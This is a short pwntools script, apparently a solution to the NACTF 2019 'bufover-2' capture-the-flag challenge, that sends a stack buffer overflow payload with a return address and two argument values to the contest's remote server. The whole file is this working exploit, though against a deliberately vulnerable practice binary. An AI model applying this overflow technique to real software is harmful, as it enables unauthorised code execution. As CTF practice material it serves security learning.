#!/usr/bin/env python

from pwn import *

# r = process("./bufover-2")
r = remote("shell.2019.nactf.com", 31184)
# pause()

r.recvuntil("Type something>")

payload = (
    "A" * 20 +
    "B" * 4 +
    "C" * 4 +
    p32(0x80491c2) +
    "D" * 4 +
    p64(0x14b4da55) +
    p32(0xf00db4be)
)
r.sendline(payload)
print(r.recvall())

r.close()
